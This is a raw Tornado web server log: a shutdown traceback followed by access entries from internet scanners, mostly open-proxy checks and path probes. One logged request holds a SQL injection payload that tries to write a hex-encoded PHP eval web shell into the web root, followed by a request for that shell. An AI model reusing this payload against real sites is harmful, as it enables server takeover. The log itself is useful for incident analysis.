Traceback (most recent call last):
  File "server.py", line 49, in <module>
    main()
  File "server.py", line 45, in main
    tornado.ioloop.IOLoop.instance().start()
  File "/usr/lib64/python2.6/site-packages/tornado/ioloop.py", line 862, in start
    event_pairs = self._impl.poll(poll_timeout)
KeyboardInterrupt
WARNING:tornado.access:404 GET http://106.2.112.147/proxyip/check (123.126.94.201) 0.51ms
WARNING:tornado.access:404 GET /admin/index.php?id=fy%27%20union%20select%21%201,2,3,0x3c3f70687020406576616c28245f504f53545b315d293f3e%20into%20dumpfile%20%27/home/wwwroot/default/res/fy.php%27%23 (45.64.113.207) 0.61ms
WARNING:tornado.access:404 GET /res/fy.php (45.64.113.207) 0.44ms
WARNING:tornado.access:404 GET http://106.2.112.147/proxyip/check (106.38.230.19) 0.46ms
WARNING:tornado.access:400 GET / (59.110.6.177) 0.54ms
WARNING:tornado.access:404 GET http://106.2.112.147/proxyip/check (106.38.231.219) 0.46ms
WARNING:tornado.access:404 GET http://106.2.112.147/proxyip/check (106.38.230.190) 0.50ms
WARNING:tornado.access:400 GET / (116.62.176.205) 0.44ms
WARNING:tornado.access:404 GET http://106.2.112.147/proxyip/check (106.38.230.190) 0.42ms
WARNING:tornado.access:404 GET http://106.2.112.147/proxyip/check (106.38.230.190) 0.47ms
WARNING:tornado.access:404 GET /master-status (140.205.201.32) 0.43ms
WARNING:tornado.access:404 GET /about/ (140.205.201.32) 0.50ms
WARNING:tornado.access:400 GET / (59.110.6.177) 0.50ms
WARNING:tornado.access:404 GET http://106.2.112.147/proxyip/check (106.38.231.218) 0.41ms
WARNING:tornado.access:404 GET http://106.2.112.147/proxyip/check (123.126.94.201) 0.69ms
WARNING:tornado.access:400 GET / (59.110.6.177) 0.49ms
WARNING:tornado.access:404 GET http://106.2.112.147/proxyip/check (123.126.94.201) 0.42ms
WARNING:tornado.access:404 GET http://106.2.112.147/proxyip/check (106.38.230.190) 0.41ms
WARNING:tornado.access:400 GET / (47.90.92.26) 0.50ms
WARNING:tornado.access:404 GET http://106.2.112.147/proxyip/check (106.38.231.218) 0.49ms
WARNING:tornado.access:404 GET http://106.2.112.147/proxyip/check (106.38.231.218) 0.49ms
WARNING:tornado.access:404 GET /master-status (140.205.225.186) 0.49ms
WARNING:tornado.access:404 GET /about/ (140.205.225.186) 0.45ms
WARNING:tornado.access:400 GET / (59.110.6.177) 0.45ms
WARNING:tornado.access:404 GET /recordings/index.php (163.172.99.46) 0.53ms
WARNING:tornado.access:404 GET http://106.2.112.147/proxyip/check (106.38.231.218) 0.47ms
WARNING:tornado.access:404 GET http://106.2.112.147/proxyip/check (106.38.230.190) 0.50ms
WARNING:tornado.access:400 GET / (59.110.6.177) 0.46ms
WARNING:tornado.access:404 GET http://106.2.112.147/proxyip/check (106.38.230.190) 0.42ms
WARNING:tornado.access:400 GET / (101.226.33.226) 0.46ms
WARNING:tornado.access:404 GET http://106.2.112.147/proxyip/check (123.126.94.201) 0.46ms
WARNING:tornado.access:400 GET / (118.178.228.154) 0.46ms
WARNING:tornado.access:404 GET http://106.2.112.147/proxyip/check (106.38.231.218) 0.48ms
